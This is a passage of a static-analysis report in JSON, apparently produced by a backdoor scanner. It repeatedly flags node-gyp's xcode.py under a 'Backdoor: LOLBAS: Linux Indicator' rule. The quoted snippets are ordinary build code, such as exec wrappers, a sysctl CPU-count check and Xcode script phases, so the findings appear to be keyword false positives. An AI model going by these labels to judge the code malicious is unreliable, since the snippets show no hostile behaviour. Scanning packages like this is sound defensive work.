                      "text": "            script = \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n\n            # Make the postbuild step depend on the output of ld or ar from this\n            # target. Apparently putting the script step after the link step isn't\n            # sufficient to ensure proper ordering in all cases. With an input\n            # declared but no outputs, the script step should run every time, as\n            # desired.\n",
                      "markdown": "`            script = \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n\n            # Make the postbuild step depend on the output of ld or ar from this\n            # target. Apparently putting the script step after the link step isn't\n            # sufficient to ensure proper ordering in all cases. With an input\n            # declared but no outputs, the script step should run every time, as\n            # desired.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1303,
                  "startColumn": 11,
                  "endLine": 1303,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\n        for postbuild in spec.get(\"postbuilds\", []):\n            action_string_sh = gyp.common.EncodePOSIXShellList(postbuild[\"action\"])\n            script = \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n\n            # Make the postbuild step depend on the output of ld or ar from this\n            # target. Apparently putting the script step after the link step isn't\n",
                    "rendered": {
                      "text": "\n        for postbuild in spec.get(\"postbuilds\", []):\n            action_string_sh = gyp.common.EncodePOSIXShellList(postbuild[\"action\"])\n            script = \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n\n            # Make the postbuild step depend on the output of ld or ar from this\n            # target. Apparently putting the script step after the link step isn't\n",
                      "markdown": "`\n        for postbuild in spec.get(\"postbuilds\", []):\n            action_string_sh = gyp.common.EncodePOSIXShellList(postbuild[\"action\"])\n            script = \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n\n            # Make the postbuild step depend on the output of ld or ar from this\n            # target. Apparently putting the script step after the link step isn't\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1182,
                  "startColumn": 15,
                  "endLine": 1182,
                  "endColumn": 23,
                  "snippet": {
                    "text": "                # would be ncpus^2 things going.  With a machine that has 2 quad-core\n                # Xeons, a build can quickly run out of processes based on\n                # scheduling/other tasks, and randomly failing builds are no good.\n                script = (\n                    \"\"\"JOB_COUNT=\"$(/usr/sbin/sysctl -n hw.ncpu)\"\nif [ \"${JOB_COUNT}\" -gt 4 ]; then\n  JOB_COUNT=4\n",
                    "rendered": {
                      "text": "                # would be ncpus^2 things going.  With a machine that has 2 quad-core\n                # Xeons, a build can quickly run out of processes based on\n                # scheduling/other tasks, and randomly failing builds are no good.\n                script = (\n                    \"\"\"JOB_COUNT=\"$(/usr/sbin/sysctl -n hw.ncpu)\"\nif [ \"${JOB_COUNT}\" -gt 4 ]; then\n  JOB_COUNT=4\n",
                      "markdown": "`                # would be ncpus^2 things going.  With a machine that has 2 quad-core\n                # Xeons, a build can quickly run out of processes based on\n                # scheduling/other tasks, and randomly failing builds are no good.\n                script = (\n                    \"\"\"JOB_COUNT=\"$(/usr/sbin/sysctl -n hw.ncpu)\"\nif [ \"${JOB_COUNT}\" -gt 4 ]; then\n  JOB_COUNT=4\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1166,
                  "startColumn": 78,
                  "endLine": 1167,
                  "snippet": {
                    "text": "                # variable anywhere other than in the leaf position.\n\n                # Don't declare any inputPaths or outputPaths.  If they're present,\n                # Xcode will provide a slight optimization by only running the script\n                # phase if any output is missing or outdated relative to any input.\n                # Unfortunately, it will also assume that all outputs are touched by\n                # the script, and if the outputs serve as files in a compilation\n                # phase, they will be unconditionally rebuilt.  Since make might not\n",
                    "rendered": {
                      "text": "                # variable anywhere other than in the leaf position.\n\n                # Don't declare any inputPaths or outputPaths.  If they're present,\n                # Xcode will provide a slight optimization by only running the script\n                # phase if any output is missing or outdated relative to any input.\n                # Unfortunately, it will also assume that all outputs are touched by\n                # the script, and if the outputs serve as files in a compilation\n                # phase, they will be unconditionally rebuilt.  Since make might not\n",
                      "markdown": "`                # variable anywhere other than in the leaf position.\n\n                # Don't declare any inputPaths or outputPaths.  If they're present,\n                # Xcode will provide a slight optimization by only running the script\n                # phase if any output is missing or outdated relative to any input.\n                # Unfortunately, it will also assume that all outputs are touched by\n                # the script, and if the outputs serve as files in a compilation\n                # phase, they will be unconditionally rebuilt.  Since make might not\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 1160,
                  "startColumn": 29,
                  "endLine": 1160,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\n                makefile.close()\n\n                # It might be nice to ensure that needed output directories exist\n                # here rather than in each target in the Makefile, but that wouldn't\n                # work if there ever was a concrete output that had an input-dependent\n                # variable anywhere other than in the leaf position.\n",
                    "rendered": {
                      "text": "\n                makefile.close()\n\n                # It might be nice to ensure that needed output directories exist\n                # here rather than in each target in the Makefile, but that wouldn't\n                # work if there ever was a concrete output that had an input-dependent\n                # variable anywhere other than in the leaf position.\n",
                      "markdown": "`\n                makefile.close()\n\n                # It might be nice to ensure that needed output directories exist\n                # here rather than in each target in the Makefile, but that wouldn't\n                # work if there ever was a concrete output that had an input-dependent\n                # variable anywhere other than in the leaf position.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 957,
                  "startColumn": 50,
                  "endLine": 957,
                  "endColumn": 58,
                  "snippet": {
                    "text": "        #         rule's output, giving it a dummy file it doesn't know how to\n        #         compile.  The rule action script would need to touch the dummy.\n        # 6584839 I need a way to declare additional inputs to a custom rule.\n        #         A possible workaround is a shell script phase prior to\n        #         compilation that touches a rule's primary input files if any\n        #         would-be additional inputs are newer than the output.  Modifying\n        #         the source tree - even just modification times - feels dirty.\n",
                    "rendered": {
                      "text": "        #         rule's output, giving it a dummy file it doesn't know how to\n        #         compile.  The rule action script would need to touch the dummy.\n        # 6584839 I need a way to declare additional inputs to a custom rule.\n        #         A possible workaround is a shell script phase prior to\n        #         compilation that touches a rule's primary input files if any\n        #         would-be additional inputs are newer than the output.  Modifying\n        #         the source tree - even just modification times - feels dirty.\n",
                      "markdown": "`        #         rule's output, giving it a dummy file it doesn't know how to\n        #         compile.  The rule action script would need to touch the dummy.\n        # 6584839 I need a way to declare additional inputs to a custom rule.\n        #         A possible workaround is a shell script phase prior to\n        #         compilation that touches a rule's primary input files if any\n        #         would-be additional inputs are newer than the output.  Modifying\n        #         the source tree - even just modification times - feels dirty.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 955,
                  "startColumn": 43,
                  "endLine": 955,
                  "endColumn": 51,
                  "snippet": {
                    "text": "        # 6584932 Need to declare that custom rule outputs should be excluded from\n        #         compilation.  A possible workaround is to lie to Xcode about a\n        #         rule's output, giving it a dummy file it doesn't know how to\n        #         compile.  The rule action script would need to touch the dummy.\n        # 6584839 I need a way to declare additional inputs to a custom rule.\n        #         A possible workaround is a shell script phase prior to\n        #         compilation that touches a rule's primary input files if any\n",
                    "rendered": {
                      "text": "        # 6584932 Need to declare that custom rule outputs should be excluded from\n        #         compilation.  A possible workaround is to lie to Xcode about a\n        #         rule's output, giving it a dummy file it doesn't know how to\n        #         compile.  The rule action script would need to touch the dummy.\n        # 6584839 I need a way to declare additional inputs to a custom rule.\n        #         A possible workaround is a shell script phase prior to\n        #         compilation that touches a rule's primary input files if any\n",
                      "markdown": "`        # 6584932 Need to declare that custom rule outputs should be excluded from\n        #         compilation.  A possible workaround is to lie to Xcode about a\n        #         rule's output, giving it a dummy file it doesn't know how to\n        #         compile.  The rule action script would need to touch the dummy.\n        # 6584839 I need a way to declare additional inputs to a custom rule.\n        #         A possible workaround is a shell script phase prior to\n        #         compilation that touches a rule's primary input files if any\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 946,
                  "startColumn": 39,
                  "endLine": 946,
                  "endColumn": 47,
                  "snippet": {
                    "text": "        # liked having the rules handled directly in Xcode during the period that\n        # I was prototyping this.\n        #\n        # 6588600 Xcode compiles custom script rule outputs too soon, compilation\n        #         fails.  This occurs when rule outputs from distinct inputs are\n        #         interdependent.  The only workaround is to put rules and their\n        #         inputs in a separate target from the one that compiles the rule\n",
                    "rendered": {
                      "text": "        # liked having the rules handled directly in Xcode during the period that\n        # I was prototyping this.\n        #\n        # 6588600 Xcode compiles custom script rule outputs too soon, compilation\n        #         fails.  This occurs when rule outputs from distinct inputs are\n        #         interdependent.  The only workaround is to put rules and their\n        #         inputs in a separate target from the one that compiles the rule\n",
                      "markdown": "`        # liked having the rules handled directly in Xcode during the period that\n        # I was prototyping this.\n        #\n        # 6588600 Xcode compiles custom script rule outputs too soon, compilation\n        #         fails.  This occurs when rule outputs from distinct inputs are\n        #         interdependent.  The only workaround is to put rules and their\n        #         inputs in a separate target from the one that compiles the rule\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 938,
                  "startColumn": 59,
                  "endLine": 938,
                  "endColumn": 67,
                  "snippet": {
                    "text": "        # the workarounds added complexity to the generator, and some workarounds\n        # actually require input files to be crafted more carefully than I'd like.\n        # Consequently, until Xcode rules are made more capable, \"rules\" input\n        # sections will be handled in Xcode output by shell script build phases\n        # performed prior to the compilation phase.\n        #\n        # The following problems with Xcode rules were found.  The numbers are\n",
                    "rendered": {
                      "text": "        # the workarounds added complexity to the generator, and some workarounds\n        # actually require input files to be crafted more carefully than I'd like.\n        # Consequently, until Xcode rules are made more capable, \"rules\" input\n        # sections will be handled in Xcode output by shell script build phases\n        # performed prior to the compilation phase.\n        #\n        # The following problems with Xcode rules were found.  The numbers are\n",
                      "markdown": "`        # the workarounds added complexity to the generator, and some workarounds\n        # actually require input files to be crafted more carefully than I'd like.\n        # Consequently, until Xcode rules are made more capable, \"rules\" input\n        # sections will be handled in Xcode output by shell script build phases\n        # performed prior to the compilation phase.\n        #\n        # The following problems with Xcode rules were found.  The numbers are\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 930,
                  "startColumn": 26,
                  "endLine": 930,
                  "endColumn": 34,
                  "snippet": {
                    "text": "        else:\n            tgt_mac_bundle_resources = []\n\n        # Add custom shell script phases driving \"make\" for \"rules\" sections.\n        #\n        # Xcode's built-in rule support is almost powerful enough to use directly,\n        # but there are a few significant deficiencies that render them unusable.\n",
                    "rendered": {
                      "text": "        else:\n            tgt_mac_bundle_resources = []\n\n        # Add custom shell script phases driving \"make\" for \"rules\" sections.\n        #\n        # Xcode's built-in rule support is almost powerful enough to use directly,\n        # but there are a few significant deficiencies that render them unusable.\n",
                      "markdown": "`        else:\n            tgt_mac_bundle_resources = []\n\n        # Add custom shell script phases driving \"make\" for \"rules\" sections.\n        #\n        # Xcode's built-in rule support is almost powerful enough to use directly,\n        # but there are a few significant deficiencies that render them unusable.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 894,
                  "startColumn": 11,
                  "endLine": 894,
                  "endColumn": 19,
                  "snippet": {
                    "text": "                script += message_sh + \"\\n\"\n            # Be sure the script runs in exec, and that if exec fails, the script\n            # exits signalling an error.\n            script += \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n            ssbp = gyp.xcodeproj_file.PBXShellScriptBuildPhase(\n                {\n                    \"inputPaths\": action[\"inputs\"],\n",
                    "rendered": {
                      "text": "                script += message_sh + \"\\n\"\n            # Be sure the script runs in exec, and that if exec fails, the script\n            # exits signalling an error.\n            script += \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n            ssbp = gyp.xcodeproj_file.PBXShellScriptBuildPhase(\n                {\n                    \"inputPaths\": action[\"inputs\"],\n",
                      "markdown": "`                script += message_sh + \"\\n\"\n            # Be sure the script runs in exec, and that if exec fails, the script\n            # exits signalling an error.\n            script += \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n            ssbp = gyp.xcodeproj_file.PBXShellScriptBuildPhase(\n                {\n                    \"inputPaths\": action[\"inputs\"],\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 892,
                  "startColumn": 74,
                  "endLine": 893,
                  "snippet": {
                    "text": "            # Include the optional message\n            if message_sh:\n                script += message_sh + \"\\n\"\n            # Be sure the script runs in exec, and that if exec fails, the script\n            # exits signalling an error.\n            script += \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n            ssbp = gyp.xcodeproj_file.PBXShellScriptBuildPhase(\n                {\n",
                    "rendered": {
                      "text": "            # Include the optional message\n            if message_sh:\n                script += message_sh + \"\\n\"\n            # Be sure the script runs in exec, and that if exec fails, the script\n            # exits signalling an error.\n            script += \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n            ssbp = gyp.xcodeproj_file.PBXShellScriptBuildPhase(\n                {\n",
                      "markdown": "`            # Include the optional message\n            if message_sh:\n                script += message_sh + \"\\n\"\n            # Be sure the script runs in exec, and that if exec fails, the script\n            # exits signalling an error.\n            script += \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n            ssbp = gyp.xcodeproj_file.PBXShellScriptBuildPhase(\n                {\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 892,
                  "startColumn": 25,
                  "endLine": 892,
                  "endColumn": 33,
                  "snippet": {
                    "text": "            # Include the optional message\n            if message_sh:\n                script += message_sh + \"\\n\"\n            # Be sure the script runs in exec, and that if exec fails, the script\n            # exits signalling an error.\n            script += \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n            ssbp = gyp.xcodeproj_file.PBXShellScriptBuildPhase(\n",
                    "rendered": {
                      "text": "            # Include the optional message\n            if message_sh:\n                script += message_sh + \"\\n\"\n            # Be sure the script runs in exec, and that if exec fails, the script\n            # exits signalling an error.\n            script += \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n            ssbp = gyp.xcodeproj_file.PBXShellScriptBuildPhase(\n",
                      "markdown": "`            # Include the optional message\n            if message_sh:\n                script += message_sh + \"\\n\"\n            # Be sure the script runs in exec, and that if exec fails, the script\n            # exits signalling an error.\n            script += \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n            ssbp = gyp.xcodeproj_file.PBXShellScriptBuildPhase(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 891,
                  "startColumn": 15,
                  "endLine": 891,
                  "endColumn": 23,
                  "snippet": {
                    "text": "            script = \"\"\n            # Include the optional message\n            if message_sh:\n                script += message_sh + \"\\n\"\n            # Be sure the script runs in exec, and that if exec fails, the script\n            # exits signalling an error.\n            script += \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n",
                    "rendered": {
                      "text": "            script = \"\"\n            # Include the optional message\n            if message_sh:\n                script += message_sh + \"\\n\"\n            # Be sure the script runs in exec, and that if exec fails, the script\n            # exits signalling an error.\n            script += \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n",
                      "markdown": "`            script = \"\"\n            # Include the optional message\n            if message_sh:\n                script += message_sh + \"\\n\"\n            # Be sure the script runs in exec, and that if exec fails, the script\n            # exits signalling an error.\n            script += \"exec \" + action_string_sh + \"\\nexit 1\\n\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 888,
                  "startColumn": 11,
                  "endLine": 888,
                  "endColumn": 19,
                  "snippet": {
                    "text": "                action_string\n            )\n\n            script = \"\"\n            # Include the optional message\n            if message_sh:\n                script += message_sh + \"\\n\"\n",
                    "rendered": {
                      "text": "                action_string\n            )\n\n            script = \"\"\n            # Include the optional message\n            if message_sh:\n                script += message_sh + \"\\n\"\n",
                      "markdown": "`                action_string\n            )\n\n            script = \"\"\n            # Include the optional message\n            if message_sh:\n                script += message_sh + \"\\n\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 867,
                  "startColumn": 56,
                  "endLine": 867,
                  "endColumn": 64,
                  "snippet": {
                    "text": "\n        # Add custom shell script phases for \"actions\" sections.\n        for action in spec_actions:\n            # There's no need to write anything into the script to ensure that the\n            # output directories already exist, because Xcode will look at the\n            # declared outputs and automatically ensure that they exist for us.\n\n",
                    "rendered": {
                      "text": "\n        # Add custom shell script phases for \"actions\" sections.\n        for action in spec_actions:\n            # There's no need to write anything into the script to ensure that the\n            # output directories already exist, because Xcode will look at the\n            # declared outputs and automatically ensure that they exist for us.\n\n",
                      "markdown": "`\n        # Add custom shell script phases for \"actions\" sections.\n        for action in spec_actions:\n            # There's no need to write anything into the script to ensure that the\n            # output directories already exist, because Xcode will look at the\n            # declared outputs and automatically ensure that they exist for us.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 865,
                  "startColumn": 26,
                  "endLine": 865,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\n        prebuild_index = 0\n\n        # Add custom shell script phases for \"actions\" sections.\n        for action in spec_actions:\n            # There's no need to write anything into the script to ensure that the\n            # output directories already exist, because Xcode will look at the\n",
                    "rendered": {
                      "text": "\n        prebuild_index = 0\n\n        # Add custom shell script phases for \"actions\" sections.\n        for action in spec_actions:\n            # There's no need to write anything into the script to ensure that the\n            # output directories already exist, because Xcode will look at the\n",
                      "markdown": "`\n        prebuild_index = 0\n\n        # Add custom shell script phases for \"actions\" sections.\n        for action in spec_actions:\n            # There's no need to write anything into the script to ensure that the\n            # output directories already exist, because Xcode will look at the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 567,
                  "startColumn": 42,
                  "endLine": 567,
                  "endColumn": 50,
                  "snippet": {
                    "text": "def ExpandXcodeVariables(string, expansions):\n    \"\"\"Expands Xcode-style $(VARIABLES) in string per the expansions dict.\n\n  In some rare cases, it is appropriate to expand Xcode variables when a\n  project file is generated.  For any substring $(VAR) in string, if VAR is a\n  key in the expansions dict, $(VAR) will be replaced with expansions[VAR].\n  Any $(VAR) substring in string for which VAR is not a key in the expansions\n",
                    "rendered": {
                      "text": "def ExpandXcodeVariables(string, expansions):\n    \"\"\"Expands Xcode-style $(VARIABLES) in string per the expansions dict.\n\n  In some rare cases, it is appropriate to expand Xcode variables when a\n  project file is generated.  For any substring $(VAR) in string, if VAR is a\n  key in the expansions dict, $(VAR) will be replaced with expansions[VAR].\n  Any $(VAR) substring in string for which VAR is not a key in the expansions\n",
                      "markdown": "`def ExpandXcodeVariables(string, expansions):\n    \"\"\"Expands Xcode-style $(VARIABLES) in string per the expansions dict.\n\n  In some rare cases, it is appropriate to expand Xcode variables when a\n  project file is generated.  For any substring $(VAR) in string, if VAR is a\n  key in the expansions dict, $(VAR) will be replaced with expansions[VAR].\n  Any $(VAR) substring in string for which VAR is not a key in the expansions\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 359,
                  "startColumn": 9,
                  "endLine": 359,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        # Create an \"All\" target if there's more than one target in this project\n        # file and the project didn't define its own \"All\" target.  Put a generated\n        # \"All\" target first so that people opening up the project for the first\n        # time will build everything by default.\n        if len(targets_for_all) > 1 and not has_custom_all:\n            xccl = CreateXCConfigurationList(configurations)\n            all_target = gyp.xcodeproj_file.PBXAggregateTarget(\n",
                    "rendered": {
                      "text": "        # Create an \"All\" target if there's more than one target in this project\n        # file and the project didn't define its own \"All\" target.  Put a generated\n        # \"All\" target first so that people opening up the project for the first\n        # time will build everything by default.\n        if len(targets_for_all) > 1 and not has_custom_all:\n            xccl = CreateXCConfigurationList(configurations)\n            all_target = gyp.xcodeproj_file.PBXAggregateTarget(\n",
                      "markdown": "`        # Create an \"All\" target if there's more than one target in this project\n        # file and the project didn't define its own \"All\" target.  Put a generated\n        # \"All\" target first so that people opening up the project for the first\n        # time will build everything by default.\n        if len(targets_for_all) > 1 and not has_custom_all:\n            xccl = CreateXCConfigurationList(configurations)\n            all_target = gyp.xcodeproj_file.PBXAggregateTarget(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 352,
                  "startColumn": 9,
                  "endLine": 352,
                  "endColumn": 15,
                  "snippet": {
                    "text": "        # Get rid of unnecessary levels of depth in groups like the Source group.\n        self.project.RootGroupsTakeOverOnlyChildren(True)\n\n        # Sort the groups nicely.  Do this after sorting the targets, because the\n        # Products group is sorted based on the order of the targets.\n        self.project.SortGroups()\n\n",
                    "rendered": {
                      "text": "        # Get rid of unnecessary levels of depth in groups like the Source group.\n        self.project.RootGroupsTakeOverOnlyChildren(True)\n\n        # Sort the groups nicely.  Do this after sorting the targets, because the\n        # Products group is sorted based on the order of the targets.\n        self.project.SortGroups()\n\n",
                      "markdown": "`        # Get rid of unnecessary levels of depth in groups like the Source group.\n        self.project.RootGroupsTakeOverOnlyChildren(True)\n\n        # Sort the groups nicely.  Do this after sorting the targets, because the\n        # Products group is sorted based on the order of the targets.\n        self.project.SortGroups()\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/xcode.py"
                },
                "region": {
                  "startLine": 322,
                  "startColumn": 19,
                  "endLine": 323,
                  "snippet": {
                    "text": "                # with an error, and fixup variable references to be shell\n                # syntax instead of xcode syntax.\n                script = (\n                    script\n                    + \"exec \"\n                    + command_prefix\n                    + \"%s\\nexit 1\\n\"\n                    % gyp.xcodeproj_file.ConvertVariablesToShellSyntax(\n",
                    "rendered": {
